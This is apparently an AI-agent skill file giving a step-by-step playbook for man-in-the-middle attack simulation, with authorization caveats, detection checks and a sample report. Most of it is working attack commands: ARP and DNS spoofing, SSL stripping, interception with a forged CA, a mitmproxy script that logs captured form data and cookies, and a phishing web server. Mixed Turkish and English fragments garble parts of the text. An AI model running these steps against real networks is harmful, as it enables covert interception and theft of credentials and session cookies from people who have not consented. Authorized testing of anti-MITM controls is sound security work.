---
name: conducting-man-in-the-middle-attack-simulation
description: Simulates man-in-the-middle attacks using Ettercap, mitmproxy, and Bettercap in authorized environments to intercept, analyze, and modify network traffic for testing encryption enforcement,
  certificate validation, and Tespit capabilities.
tags:
- bettercap
- ettercap
- siber-güvenlik
- mitm
- network-security
- fetih
- cybersecurity
- mitmproxy
triggers:
- IDS
- IPS
- alert
- attack
- authentication
- ağ güvenliği
- certificate
- conducting
- dns
- encryption
- firewall
- http
category: network-security
source_subdomain: network-security
nist_csf:
- PR.IR-01
- DE.CM-01
- ID.AM-03
- PR.DS-02
adapted_for: fetih
---

# Conducting Man in the Middle Attack Simulation


## Ne Zaman Kullanılır

- Testing whether applications properly validate TLS certificates and enforce encrypted communications
- Demonstrating the risk of cleartext protocols (HTTP, FTP, Telnet, SMTP) to organization stakeholders
- Validating that HSTS, certificate pinning, and other anti-MITM controls are correctly implemented
- Assessing network Tespit capabilities for ARP spoofing, DHCP spoofing, and DNS spoofing attacks
- Training incident response teams to identify and respond to MITM attack indicators

**Kullanma:** on production networks without explicit written authorization and a rollback plan, against systems you do not own or have permission to test, or for intercepting communications of uninvolved third parties.

## Ön Gereksinimler

- Written authorization specifying in-scope targets and approved MITM techniques
- Bettercap 2.x, Ettercap, and mitmproxy kurulu: the attacker machine
- Layer 2 Erişim: the same network segment as target hosts
- Custom CA certificate for TLS interception testing (generated specifically for the engagement)
- Wireshark or tshark for capturing and verifying intercepted traffic
- Isolated lab environment or approved production test window with rollback procedures

## İş Akışı

### Adım 1: Kur: the Attack Environment

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo sysctl -w net.ipv6.conf.all.forwarding=1

sudo sysctl -w net.ipv4.conf.all.send_redirects=0

openssl genrsa -out mitm-ca.key 4096
openssl req -new -x509 -days 30 -key mitm-ca.key -out mitm-ca.crt \
  -subj "/CN=MITM Test CA/O=Security Assessment/C=US"

sudo bettercap -iface eth0 -eval "net.probe on; sleep 10; net.show; quit"
```

### Adım 2: Execute ARP-Based MITM with Bettercap

```bash
sudo bettercap -iface eth0

> net.probe on

> net.show

> set arp.spoof.targets 192.168.1.50
> set arp.spoof.fullduplex true

> arp.spoof on

> set http.proxy.sslstrip true
> http.proxy on

> set https.proxy.certificate mitm-ca.crt
> set https.proxy.key mitm-ca.key
> https.proxy on

> set dns.spoof.domains example.com,*.example.com
> set dns.spoof.address 192.168.1.99
> dns.spoof on

> set net.sniff.verbose true
> set net.sniff.filter "tcp port 80 or tcp port 21 or tcp port 110"
> net.sniff on
```

### Adım 3: Intercept HTTP/HTTPS Traffic with mitmproxy

```bash
sudo mitmproxy --mode transparent --set confdir=~/.mitmproxy \
  --set ssl_insecure=true -w mitm_capture.flow

sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

cat > extract_creds.py << 'PYEOF'
"""mitmproxy script to extract credentials from intercepted traffic."""
from mitmproxy import http
import json

def request(flow: http.HTTPFlow):
    if flow.request.method == "POST":
        content_type = flow.request.headers.get("content-type", "")
        if "form" in content_type or "json" in content_type:
            with open("captured_forms.log", "a") as f:
                f.write(f"URL: {flow.request.pretty_url}\n")
                f.write(f"Data: {flow.request.get_text()}\n")
                f.write("---\n")

def response(flow: http.HTTPFlow):
    # Log authentication cookies
    if "set-cookie" in flow.response.headers:
        with open("captured_cookies.log", "a") as f:
            f.write(f"URL: {flow.request.pretty_url}\n")
            f.write(f"Cookie: {flow.response.headers['set-cookie']}\n")
            f.write("---\n")
PYEOF

sudo mitmproxy --mode transparent -s extract_creds.py -w mitm_capture.flow
```

### Adım 4: Perform DNS Spoofing and DHCP Attacks

```bash
sudo tee /etc/ettercap/etter.dns << 'EOF'
example.com      A   192.168.1.99
*.example.com    A   192.168.1.99
www.example.com  A   192.168.1.99
EOF

sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof /192.168.1.50// /192.168.1.1//

sudo bettercap -iface eth0
> set dhcp6.spoof.domains example.com
> dhcp6.spoof on

sudo python3 -m http.server 80 --directory /var/www/phishing/
```

### Adım 5: Validate Tespit and Test Controls

```bash

curl -v -k -L http://example.com 2>&1 | grep -i "strict-transport-security"

grep -i "arp" /var/log/snort/alert_fast.txt


cat /opt/zeek/logs/current/notice.log | zeek-cut note msg

tshark -i eth0 -f "host 192.168.1.50" -w mitm_evidence.pcapng -a duration:300
```

### Adım 6: Clean Up and Document Results

```bash
> arp.spoof off
> http.proxy off
> https.proxy off
> dns.spoof off
> quit

sudo sysctl -w net.ipv4.ip_forward=0

sudo iptables -t nat -F PREROUTING


echo "MITM Simulation completed at $(date)" >> mitm_report.txt
sha256sum mitm_capture.flow mitm_evidence.pcapng >> mitm_report.txt
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Man-in-the-Middle (MITM)** | Attack where the adversary secretly intercepts and potentially alters communication between two parties who believe they are communicating directly |
| **SSL Stripping** | Downgrade attack that converts HTTPS connections to HTTP by intercepting the initial HTTP request before the TLS upgrade, bypassing encryption |
| **HSTS (HTTP Strict Transport Security)** | Browser security policy that forces HTTPS connections and prevents SSL stripping by caching the requirement for encrypted connections |
| **Certificate Pinning** | Application security control that validates server certificates against a pre-configured set of trusted certificates, Tespit etme MITM proxy certificates |
| **ARP Cache Poisoning** | Layer 2 attack technique that corrupts the ARP cache of target hosts to redirect traffic through the attacker's machine |
| **Transparent Proxy** | Proxy that intercepts traffic without requiring client-side configuration, typically using iptables REDIRECT rules to capture traffic destined for standard ports |

## Tools & Systems

- **Bettercap 2.x**: Swiss-army knife for network attacks supporting ARP/DNS/DHCP spoofing, HTTP/HTTPS proxying, and credential sniffing with a modular architecture
- **mitmproxy**: Interactive TLS-capable proxy for intercepting, Denetle:ing, and modifying HTTP/HTTPS traffic with Python scripting support
- **Ettercap**: Legacy MITM tool supporting ARP spoofing, DNS spoofing, and plugin-based traffic manipulation
- **sslstrip**: Tool that implements SSL stripping attacks by proxying HTTP-to-HTTPS redirects and serving downgraded HTTP versions
- **Wireshark**: Packet analyzer for verifying traffic interception and capturing evidence of successful or failed MITM attempts

## Common Scenarios

### Scenario: Testing HTTPS Enforcement on an Internal Web Application

**Context**: A development team claims their internal web application enforces HTTPS with HSTS and certificate pinning. The security team needs to verify these controls during an authorized assessment. The application runs on 10.10.20.50 and is accessed by workstations on the 10.10.1.0/24 VLAN.

**Approach**:
1. Kur: Bettercap on the same VLAN and ARP-spoof a test workstation (10.10.1.100)
2. Enable SSL stripping via Bettercap's HTTP proxy to test whether the application can be downgraded to HTTP
3. Enable HTTPS interception with a test CA certificate to test certificate validation
4. Attempt to access the application from the test workstation and observe whether the browser or application rejects the connection
5. Şunu doğrula: HSTS headers are present and have appropriate max-age values
6. Document that the thick client does not implement certificate pinning (accepts the MITM CA) while the web browser properly rejects it due to HSTS preload
7. Recommend implementing certificate pinning in the thick client application

**Pitfalls**:
- Forgetting to enable IP forwarding, causing a denial of service instead of transparent interception
- Testing SSL stripping on an application with HSTS preloaded in the browser and concluding HSTS works, when a fresh browser instance might be vulnerable
- Not cleaning up ARP spoofing after testing, causing intermittent connectivity issues for the target
- Running mitmproxy without the transparent mode flag, requiring manual proxy configuration that changes the test conditions

## Output Format

```
## MITM Simulation Report

**Test ID**: MITM-2024-001
**Date**: 2024-03-15 14:00-16:00 UTC
**Target Application**: https://app.internal.corp (10.10.20.50)
**Test Workstation**: 10.10.1.100
**Attacker Machine**: 10.10.1.99

### Control Validation Results

| Control | Status | Details |
|---------|--------|---------|
| HTTPS Redirect | PASS | HTTP requests redirect to HTTPS with 301 |
| HSTS Header | PASS | max-age=31536000; includeSubDomains; preload |
| SSL Stripping (Browser) | BLOCKED | HSTS prevents downgrade in Chrome/Firefox |
| SSL Stripping (Thick Client) | VULNERABLE | Client follows HTTP redirect without HSTS |
| Cert Pinning (Browser) | N/A | Standard CA validation only |
| Cert Pinning (Thick Client) | VULNERABLE | Accepts MITM CA without validation |
| IDS Tespit | PASS | Snort generated ARP spoof alert in 12 seconds |

### Öneriler
1. Implement certificate pinning in the thick client (high priority)
2. Add HSTS preload list submission for the domain
3. Enable DAI on access-layer switches for Layer 2 protection
4. Configure application to reject connections from non-pinned certificates
```

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 798b805b493e9097
-->

